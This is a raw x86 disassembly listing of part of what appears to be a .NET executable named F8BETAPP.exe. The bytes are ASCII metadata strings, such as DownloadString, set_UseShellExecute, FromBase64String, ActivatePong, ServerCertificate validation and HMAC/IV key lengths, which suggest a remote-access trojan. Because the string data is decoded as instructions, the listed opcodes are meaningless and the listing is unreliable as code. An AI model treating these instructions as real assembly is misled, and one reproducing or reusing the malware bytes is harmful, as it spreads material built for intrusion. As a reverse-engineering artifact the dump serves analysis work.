  405f15:	6c                   	insb   (%dx),%es:(%edi)
  405f16:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  405f1d:	6e 
  405f1e:	4e                   	dec    %esi
  405f1f:	61                   	popa
  405f20:	6d                   	insl   (%dx),%es:(%edi)
  405f21:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405f25:	74 5f                	je     0x405f86
  405f27:	55                   	push   %ebp
  405f28:	73 65                	jae    0x405f8f
  405f2a:	72 4e                	jb     0x405f7a
  405f2c:	61                   	popa
  405f2d:	6d                   	insl   (%dx),%es:(%edi)
  405f2e:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  405f32:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  405f36:	6f                   	outsl  %ds:(%esi),(%dx)
  405f37:	73 74                	jae    0x405fad
  405f39:	4e                   	dec    %esi
  405f3a:	61                   	popa
  405f3b:	6d                   	insl   (%dx),%es:(%edi)
  405f3c:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  405f40:	6d                   	insl   (%dx),%es:(%edi)
  405f41:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  405f46:	65 54                	gs push %esp
  405f48:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  405f4f:	5f                   	pop    %edi
  405f50:	4c                   	dec    %esp
  405f51:	61                   	popa
  405f52:	73 74                	jae    0x405fc8
  405f54:	57                   	push   %edi
  405f55:	72 69                	jb     0x405fc0
  405f57:	74 65                	je     0x405fbe
  405f59:	54                   	push   %esp
  405f5a:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  405f61:	6e                   	outsb  %ds:(%esi),(%dx)
  405f62:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  405f69:	54                   	push   %esp
  405f6a:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  405f71:	74 65                	je     0x405fd8
  405f73:	4c                   	dec    %esp
  405f74:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  405f7b:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  405f7e:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  405f82:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  405f89:	6d                   	insl   (%dx),%es:(%edi)
  405f8a:	65 54                	gs push %esp
  405f8c:	79 70                	jns    0x405ffe
  405f8e:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  405f92:	6c                   	insb   (%dx),%es:(%edi)
  405f93:	75 65                	jne    0x405ffa
  405f95:	54                   	push   %esp
  405f96:	79 70                	jns    0x406008
  405f98:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405f9c:	6f                   	outsl  %ds:(%esi),(%dx)
  405f9d:	74 6f                	je     0x40600e
  405f9f:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  405fa2:	54                   	push   %esp
  405fa3:	79 70                	jns    0x406015
  405fa5:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405fa9:	74 54                	je     0x405fff
  405fab:	79 70                	jns    0x40601d
  405fad:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  405fb1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  405fb4:	74 54                	je     0x40600a
  405fb6:	79 70                	jns    0x406028
  405fb8:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  405fbc:	73 74                	jae    0x406032
  405fbe:	65 6d                	gs insl (%dx),%es:(%edi)
  405fc0:	2e 43                	cs inc %ebx
  405fc2:	6f                   	outsl  %ds:(%esi),(%dx)
  405fc3:	72 65                	jb     0x40602a
  405fc5:	00 53 65             	add    %dl,0x65(%ebx)
  405fc8:	72 76                	jb     0x406040
  405fca:	65 72 73             	gs jb  0x406040
  405fcd:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  405fd4:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  405fd8:	6f                   	outsl  %ds:(%esi),(%dx)
  405fd9:	73 65                	jae    0x406040
  405fdb:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  405fdf:	70 6f                	jo     0x406050
  405fe1:	73 65                	jae    0x406048
  405fe3:	00 53 74             	add    %dl,0x74(%ebx)
  405fe6:	72 52                	jb     0x40603a
  405fe8:	65 76 65             	gs jbe 0x406050
  405feb:	72 73                	jb     0x406060
  405fed:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  405ff1:	30 39                	xor    %bh,(%ecx)
  405ff3:	43                   	inc    %ebx
  405ff4:	65 72 74             	gs jb  0x40606b
  405ff7:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405ffe:	00 56 61             	add    %dl,0x61(%esi)
  406001:	6c                   	insb   (%dx),%es:(%edi)
  406002:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  406009:	72 
  40600a:	76 65                	jbe    0x406071
  40600c:	72 43                	jb     0x406051
  40600e:	65 72 74             	gs jb  0x406085
  406011:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406018:	00 63 65             	add    %ah,0x65(%ebx)
  40601b:	72 74                	jb     0x406091
  40601d:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406024:	00 43 72             	add    %al,0x72(%ebx)
  406027:	65 61                	gs popa
  406029:	74 65                	je     0x406090
  40602b:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  40602f:	75 67                	jne    0x406098
  406031:	67 65 72 42          	addr16 gs jb 0x406077
  406035:	72 6f                	jb     0x4060a6
  406037:	77 73                	ja     0x4060ac
  406039:	61                   	popa
  40603a:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  40603e:	74 61                	je     0x4060a1
  406040:	74 65                	je     0x4060a7
  406042:	00 53 65             	add    %dl,0x65(%ebx)
  406045:	74 54                	je     0x40609b
  406047:	68 72 65 61 64       	push   $0x64616572
  40604c:	45                   	inc    %ebp
  40604d:	78 65                	js     0x4060b4
  40604f:	63 75 74             	arpl   %esi,0x74(%ebp)
  406052:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  406059:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40605e:	65 74 65             	gs je  0x4060c6
  406061:	00 43 61             	add    %al,0x61(%ebx)
  406064:	6c                   	insb   (%dx),%es:(%edi)
  406065:	6c                   	insb   (%dx),%es:(%edi)
  406066:	53                   	push   %ebx
  406067:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40606e:	74 
  40606f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406073:	6d                   	insl   (%dx),%es:(%edi)
  406074:	70 69                	jo     0x4060df
  406076:	6c                   	insb   (%dx),%es:(%edi)
  406077:	65 72 47             	gs jb  0x4060c1
  40607a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40607c:	65 72 61             	gs jb  0x4060e0
  40607f:	74 65                	je     0x4060e6
  406081:	64 41                	fs inc %ecx
  406083:	74 74                	je     0x4060f9
  406085:	72 69                	jb     0x4060f0
  406087:	62 75 74             	bound  %esi,0x74(%ebp)
  40608a:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40608f:	75 67                	jne    0x4060f8
  406091:	67 61                	addr16 popa
  406093:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  406097:	74 74                	je     0x40610d
  406099:	72 69                	jb     0x406104
  40609b:	62 75 74             	bound  %esi,0x74(%ebp)
  40609e:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4060a3:	75 67                	jne    0x40610c
  4060a5:	67 65 72 42          	addr16 gs jb 0x4060eb
  4060a9:	72 6f                	jb     0x40611a
  4060ab:	77 73                	ja     0x406120
  4060ad:	61                   	popa
  4060ae:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4060b2:	74 74                	je     0x406128
  4060b4:	72 69                	jb     0x40611f
  4060b6:	62 75 74             	bound  %esi,0x74(%ebp)
  4060b9:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4060bd:	6d                   	insl   (%dx),%es:(%edi)
  4060be:	56                   	push   %esi
  4060bf:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4060c6:	74 74                	je     0x40613c
  4060c8:	72 69                	jb     0x406133
  4060ca:	62 75 74             	bound  %esi,0x74(%ebp)
  4060cd:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4060d1:	73 65                	jae    0x406138
  4060d3:	6d                   	insl   (%dx),%es:(%edi)
  4060d4:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4060d8:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4060df:	72 
  4060e0:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4060e7:	73 73                	jae    0x40615c
  4060e9:	65 6d                	gs insl (%dx),%es:(%edi)
  4060eb:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4060ef:	72 61                	jb     0x406152
  4060f1:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4060f4:	61                   	popa
  4060f5:	72 6b                	jb     0x406162
  4060f7:	41                   	inc    %ecx
  4060f8:	74 74                	je     0x40616e
  4060fa:	72 69                	jb     0x406165
  4060fc:	62 75 74             	bound  %esi,0x74(%ebp)
  4060ff:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  406104:	67 65 74 46          	addr16 gs je 0x40614e
  406108:	72 61                	jb     0x40616b
  40610a:	6d                   	insl   (%dx),%es:(%edi)
  40610b:	65 77 6f             	gs ja  0x40617d
  40610e:	72 6b                	jb     0x40617b
  406110:	41                   	inc    %ecx
  406111:	74 74                	je     0x406187
  406113:	72 69                	jb     0x40617e
  406115:	62 75 74             	bound  %esi,0x74(%ebp)
  406118:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40611c:	73 65                	jae    0x406183
  40611e:	6d                   	insl   (%dx),%es:(%edi)
  40611f:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  406123:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40612a:	69 
  40612b:	6f                   	outsl  %ds:(%esi),(%dx)
  40612c:	6e                   	outsb  %ds:(%esi),(%dx)
  40612d:	41                   	inc    %ecx
  40612e:	74 74                	je     0x4061a4
  406130:	72 69                	jb     0x40619b
  406132:	62 75 74             	bound  %esi,0x74(%ebp)
  406135:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406139:	73 65                	jae    0x4061a0
  40613b:	6d                   	insl   (%dx),%es:(%edi)
  40613c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406140:	6f                   	outsl  %ds:(%esi),(%dx)
  406141:	6e                   	outsb  %ds:(%esi),(%dx)
  406142:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  406148:	74 69                	je     0x4061b3
  40614a:	6f                   	outsl  %ds:(%esi),(%dx)
  40614b:	6e                   	outsb  %ds:(%esi),(%dx)
  40614c:	41                   	inc    %ecx
  40614d:	74 74                	je     0x4061c3
  40614f:	72 69                	jb     0x4061ba
  406151:	62 75 74             	bound  %esi,0x74(%ebp)
  406154:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406158:	73 65                	jae    0x4061bf
  40615a:	6d                   	insl   (%dx),%es:(%edi)
  40615b:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40615f:	65 73 63             	gs jae 0x4061c5
  406162:	72 69                	jb     0x4061cd
  406164:	70 74                	jo     0x4061da
  406166:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40616d:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  406174:	6f                   	outsl  %ds:(%esi),(%dx)
  406175:	6d                   	insl   (%dx),%es:(%edi)
  406176:	70 69                	jo     0x4061e1
  406178:	6c                   	insb   (%dx),%es:(%edi)
  406179:	61                   	popa
  40617a:	74 69                	je     0x4061e5
  40617c:	6f                   	outsl  %ds:(%esi),(%dx)
  40617d:	6e                   	outsb  %ds:(%esi),(%dx)
  40617e:	52                   	push   %edx
  40617f:	65 6c                	gs insb (%dx),%es:(%edi)
  406181:	61                   	popa
  406182:	78 61                	js     0x4061e5
  406184:	74 69                	je     0x4061ef
  406186:	6f                   	outsl  %ds:(%esi),(%dx)
  406187:	6e                   	outsb  %ds:(%esi),(%dx)
  406188:	73 41                	jae    0x4061cb
  40618a:	74 74                	je     0x406200
  40618c:	72 69                	jb     0x4061f7
  40618e:	62 75 74             	bound  %esi,0x74(%ebp)
  406191:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406195:	73 65                	jae    0x4061fc
  406197:	6d                   	insl   (%dx),%es:(%edi)
  406198:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40619c:	72 6f                	jb     0x40620d
  40619e:	64 75 63             	fs jne 0x406204
  4061a1:	74 41                	je     0x4061e4
  4061a3:	74 74                	je     0x406219
  4061a5:	72 69                	jb     0x406210
  4061a7:	62 75 74             	bound  %esi,0x74(%ebp)
  4061aa:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4061ae:	73 65                	jae    0x406215
  4061b0:	6d                   	insl   (%dx),%es:(%edi)
  4061b1:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4061b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4061b6:	70 79                	jo     0x406231
  4061b8:	72 69                	jb     0x406223
  4061ba:	67 68 74 41 74 74    	addr16 push $0x74744174
  4061c0:	72 69                	jb     0x40622b
  4061c2:	62 75 74             	bound  %esi,0x74(%ebp)
  4061c5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4061c9:	73 65                	jae    0x406230
  4061cb:	6d                   	insl   (%dx),%es:(%edi)
  4061cc:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4061d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4061d1:	6d                   	insl   (%dx),%es:(%edi)
  4061d2:	70 61                	jo     0x406235
  4061d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4061d5:	79 41                	jns    0x406218
  4061d7:	74 74                	je     0x40624d
  4061d9:	72 69                	jb     0x406244
  4061db:	62 75 74             	bound  %esi,0x74(%ebp)
  4061de:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4061e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4061e3:	74 69                	je     0x40624e
  4061e5:	6d                   	insl   (%dx),%es:(%edi)
  4061e6:	65 43                	gs inc %ebx
  4061e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4061e9:	6d                   	insl   (%dx),%es:(%edi)
  4061ea:	70 61                	jo     0x40624d
  4061ec:	74 69                	je     0x406257
  4061ee:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4061f1:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4061f8:	69 
  4061f9:	62 75 74             	bound  %esi,0x74(%ebp)
  4061fc:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  406200:	74 5f                	je     0x406261
  406202:	55                   	push   %ebp
  406203:	73 65                	jae    0x40626a
  406205:	53                   	push   %ebx
  406206:	68 65 6c 6c 45       	push   $0x456c6c65
  40620b:	78 65                	js     0x406272
  40620d:	63 75 74             	arpl   %esi,0x74(%ebp)
  406210:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  406214:	74 65                	je     0x40627b
  406216:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  40621a:	65 74 65             	gs je  0x406282
  40621d:	56                   	push   %esi
  40621e:	61                   	popa
  40621f:	6c                   	insb   (%dx),%es:(%edi)
  406220:	75 65                	jne    0x406287
  406222:	00 47 65             	add    %al,0x65(%edi)
  406225:	74 56                	je     0x40627d
  406227:	61                   	popa
  406228:	6c                   	insb   (%dx),%es:(%edi)
  406229:	75 65                	jne    0x406290
  40622b:	00 53 65             	add    %dl,0x65(%ebx)
  40622e:	74 56                	je     0x406286
  406230:	61                   	popa
  406231:	6c                   	insb   (%dx),%es:(%edi)
  406232:	75 65                	jne    0x406299
  406234:	00 76 61             	add    %dh,0x61(%esi)
  406237:	6c                   	insb   (%dx),%es:(%edi)
  406238:	75 65                	jne    0x40629f
  40623a:	00 67 65             	add    %ah,0x65(%edi)
  40623d:	74 5f                	je     0x40629e
  40623f:	4b                   	dec    %ebx
  406240:	65 65 70 41          	gs gs jo 0x406285
  406244:	6c                   	insb   (%dx),%es:(%edi)
  406245:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  40624c:	5f                   	pop    %edi
  40624d:	4b                   	dec    %ebx
  40624e:	65 65 70 41          	gs gs jo 0x406293
  406252:	6c                   	insb   (%dx),%es:(%edi)
  406253:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40625a:	6f                   	outsl  %ds:(%esi),(%dx)
  40625b:	76 65                	jbe    0x4062c2
  40625d:	00 46 38             	add    %al,0x38(%esi)
  406260:	42                   	inc    %edx
  406261:	45                   	inc    %ebp
  406262:	54                   	push   %esp
  406263:	41                   	inc    %ecx
  406264:	50                   	push   %eax
  406265:	50                   	push   %eax
  406266:	2e 65 78 65          	cs js,pn 0x4062cf
  40626a:	00 73 65             	add    %dh,0x65(%ebx)
  40626d:	74 5f                	je     0x4062ce
  40626f:	42                   	inc    %edx
  406270:	6c                   	insb   (%dx),%es:(%edi)
  406271:	6f                   	outsl  %ds:(%esi),(%dx)
  406272:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  406275:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40627c:	5f                   	pop    %edi
  40627d:	54                   	push   %esp
  40627e:	6f                   	outsl  %ds:(%esi),(%dx)
  40627f:	74 61                	je     0x4062e2
  406281:	6c                   	insb   (%dx),%es:(%edi)
  406282:	53                   	push   %ebx
  406283:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40628a:	5f                   	pop    %edi
  40628b:	48                   	dec    %eax
  40628c:	65 61                	gs popa
  40628e:	64 65 72 53          	fs gs jb 0x4062e5
  406292:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406299:	5f                   	pop    %edi
  40629a:	48                   	dec    %eax
  40629b:	65 61                	gs popa
  40629d:	64 65 72 53          	fs gs jb 0x4062f4
  4062a1:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4062a8:	5f                   	pop    %edi
  4062a9:	53                   	push   %ebx
  4062aa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4062ac:	64 42                	fs inc %edx
  4062ae:	75 66                	jne    0x406316
  4062b0:	66 65 72 53          	data16 gs jb 0x406307
  4062b4:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4062bb:	5f                   	pop    %edi
  4062bc:	52                   	push   %edx
  4062bd:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4062c1:	76 65                	jbe    0x406328
  4062c3:	42                   	inc    %edx
  4062c4:	75 66                	jne    0x40632c
  4062c6:	66 65 72 53          	data16 gs jb 0x40631d
  4062ca:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4062d1:	5f                   	pop    %edi
  4062d2:	4b                   	dec    %ebx
  4062d3:	65 79 53             	gs jns 0x406329
  4062d6:	69 7a 65 00 43 72 79 	imul   $0x79724300,0x65(%edx),%edi
  4062dd:	70 74                	jo     0x406353
  4062df:	6f                   	outsl  %ds:(%esi),(%dx)
  4062e0:	43                   	inc    %ebx
  4062e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4062e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4062e3:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4062e9:	74 5f                	je     0x40634a
  4062eb:	50                   	push   %eax
  4062ec:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4062f3:	5f                   	pop    %edi
  4062f4:	50                   	push   %eax
  4062f5:	69 6e 67 00 46 6c 6f 	imul   $0x6f6c4600,0x67(%esi),%ebp
  4062fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4062fd:	64 50                	fs push %eax
  4062ff:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406306:	74 65                	je     0x40636d
  406308:	6d                   	insl   (%dx),%es:(%edi)
  406309:	2e 54                	cs push %esp
  40630b:	68 72 65 61 64       	push   $0x64616572
  406310:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  406317:	5f                   	pop    %edi
  406318:	50                   	push   %eax
  406319:	61                   	popa
  40631a:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  406321:	64 64 
  406323:	5f                   	pop    %edi
  406324:	53                   	push   %ebx
  406325:	65 73 73             	gs jae 0x40639b
  406328:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40632f:	6e                   	outsb  %ds:(%esi),(%dx)
  406330:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  406334:	73 74                	jae    0x4063aa
  406336:	65 6d                	gs insl (%dx),%es:(%edi)
  406338:	45                   	inc    %ebp
  406339:	76 65                	jbe    0x4063a0
  40633b:	6e                   	outsb  %ds:(%esi),(%dx)
  40633c:	74 73                	je     0x4063b1
  40633e:	5f                   	pop    %edi
  40633f:	53                   	push   %ebx
  406340:	65 73 73             	gs jae 0x4063b6
  406343:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40634a:	6e                   	outsb  %ds:(%esi),(%dx)
  40634b:	67 00 45 6e          	add    %al,0x6e(%di)
  40634f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406352:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406359:	74 65                	je     0x4063c0
  40635b:	6d                   	insl   (%dx),%es:(%edi)
  40635c:	2e 44                	cs inc %esp
  40635e:	72 61                	jb     0x4063c1
  406360:	77 69                	ja     0x4063cb
  406362:	6e                   	outsb  %ds:(%esi),(%dx)
  406363:	67 2e 49             	addr16 cs dec %ecx
  406366:	6d                   	insl   (%dx),%es:(%edi)
  406367:	61                   	popa
  406368:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  40636f:	73 
  406370:	74 65                	je     0x4063d7
  406372:	6d                   	insl   (%dx),%es:(%edi)
  406373:	2e 52                	cs push %edx
  406375:	75 6e                	jne    0x4063e5
  406377:	74 69                	je     0x4063e2
  406379:	6d                   	insl   (%dx),%es:(%edi)
  40637a:	65 2e 56             	gs cs push %esi
  40637d:	65 72 73             	gs jb  0x4063f3
  406380:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  406387:	46                   	inc    %esi
  406388:	72 6f                	jb     0x4063f9
  40638a:	6d                   	insl   (%dx),%es:(%edi)
  40638b:	42                   	inc    %edx
  40638c:	61                   	popa
  40638d:	73 65                	jae    0x4063f4
  40638f:	36 34 53             	ss xor $0x53,%al
  406392:	74 72                	je     0x406406
  406394:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  40639b:	61                   	popa
  40639c:	73 65                	jae    0x406403
  40639e:	36 34 53             	ss xor $0x53,%al
  4063a1:	74 72                	je     0x406415
  4063a3:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  4063aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4063ab:	6c                   	insb   (%dx),%es:(%edi)
  4063ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4063ad:	61                   	popa
  4063ae:	64 53                	fs push %ebx
  4063b0:	74 72                	je     0x406424
  4063b2:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  4063b9:	74 72                	je     0x40642d
  4063bb:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  4063c2:	5f                   	pop    %edi
  4063c3:	41                   	inc    %ecx
  4063c4:	73 53                	jae    0x406419
  4063c6:	74 72                	je     0x40643a
  4063c8:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4063cf:	5f                   	pop    %edi
  4063d0:	41                   	inc    %ecx
  4063d1:	73 53                	jae    0x406426
  4063d3:	74 72                	je     0x406447
  4063d5:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4063dc:	41                   	inc    %ecx
  4063dd:	73 53                	jae    0x406432
  4063df:	74 72                	je     0x406453
  4063e1:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4063e8:	53                   	push   %ebx
  4063e9:	74 72                	je     0x40645d
  4063eb:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4063f2:	73 74                	jae    0x406468
  4063f4:	72 69                	jb     0x40645f
  4063f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4063f7:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4063fb:	73 74                	jae    0x406471
  4063fd:	65 6d                	gs insl (%dx),%es:(%edi)
  4063ff:	2e 44                	cs inc %esp
  406401:	72 61                	jb     0x406464
  406403:	77 69                	ja     0x40646e
  406405:	6e                   	outsb  %ds:(%esi),(%dx)
  406406:	67 00 67 65          	add    %ah,0x65(%bx)
  40640a:	74 5f                	je     0x40646b
  40640c:	41                   	inc    %ecx
  40640d:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406411:	61                   	popa
  406412:	74 65                	je     0x406479
  406414:	50                   	push   %eax
  406415:	6f                   	outsl  %ds:(%esi),(%dx)
  406416:	6e                   	outsb  %ds:(%esi),(%dx)
  406417:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40641b:	74 5f                	je     0x40647c
  40641d:	41                   	inc    %ecx
  40641e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406422:	61                   	popa
  406423:	74 65                	je     0x40648a
  406425:	50                   	push   %eax
  406426:	6f                   	outsl  %ds:(%esi),(%dx)
  406427:	6e                   	outsb  %ds:(%esi),(%dx)
  406428:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40642c:	74 5f                	je     0x40648d
  40642e:	45                   	inc    %ebp
  40642f:	72 72                	jb     0x4064a3
  406431:	6f                   	outsl  %ds:(%esi),(%dx)
  406432:	72 44                	jb     0x406478
  406434:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  40643b:	73 67                	jae    0x4064a4
  40643d:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  406441:	75 67                	jne    0x4064aa
  406443:	00 43 6f             	add    %al,0x6f(%ebx)
  406446:	6d                   	insl   (%dx),%es:(%edi)
  406447:	70 75                	jo     0x4064be
  406449:	74 65                	je     0x4064b0
  40644b:	48                   	dec    %eax
  40644c:	61                   	popa
  40644d:	73 68                	jae    0x4064b7
  40644f:	00 73 74             	add    %dh,0x74(%ebx)
  406452:	72 54                	jb     0x4064a8
  406454:	6f                   	outsl  %ds:(%esi),(%dx)
  406455:	48                   	dec    %eax
  406456:	61                   	popa
  406457:	73 68                	jae    0x4064c1
  406459:	00 47 65             	add    %al,0x65(%edi)
  40645c:	74 48                	je     0x4064a6
  40645e:	61                   	popa
  40645f:	73 68                	jae    0x4064c9
  406461:	00 56 65             	add    %dl,0x65(%esi)
  406464:	72 69                	jb     0x4064cf
  406466:	66 79 48             	data16 jns 0x4064b1
  406469:	61                   	popa
  40646a:	73 68                	jae    0x4064d4
  40646c:	00 46 6c             	add    %al,0x6c(%esi)
  40646f:	75 73                	jne    0x4064e4
  406471:	68 00 67 65 74       	push   $0x74656700
  406476:	5f                   	pop    %edi
  406477:	45                   	inc    %ebp
  406478:	78 65                	js     0x4064df
  40647a:	63 75 74             	arpl   %esi,0x74(%ebp)
  40647d:	61                   	popa
  40647e:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  406482:	61                   	popa
  406483:	74 68                	je     0x4064ed
  406485:	00 47 65             	add    %al,0x65(%edi)
  406488:	74 54                	je     0x4064de
  40648a:	65 6d                	gs insl (%dx),%es:(%edi)
  40648c:	70 50                	jo     0x4064de
  40648e:	61                   	popa
  40648f:	74 68                	je     0x4064f9
  406491:	00 48 6d             	add    %cl,0x6d(%eax)
  406494:	61                   	popa
  406495:	63 53 68             	arpl   %edx,0x68(%ebx)
  406498:	61                   	popa
  406499:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40649f:	67 74 68             	addr16 je 0x40650a
  4064a2:	00 67 65             	add    %ah,0x65(%edi)
  4064a5:	74 5f                	je     0x406506
  4064a7:	4c                   	dec    %esp
  4064a8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4064aa:	67 74 68             	addr16 je 0x406515
  4064ad:	00 49 76             	add    %cl,0x76(%ecx)
  4064b0:	4c                   	dec    %esp
  4064b1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4064b3:	67 74 68             	addr16 je 0x40651e
  4064b6:	00 41 75             	add    %al,0x75(%ecx)
  4064b9:	74 68                	je     0x406523
  4064bb:	4b                   	dec    %ebx
  4064bc:	65 79 4c             	gs jns 0x40650b
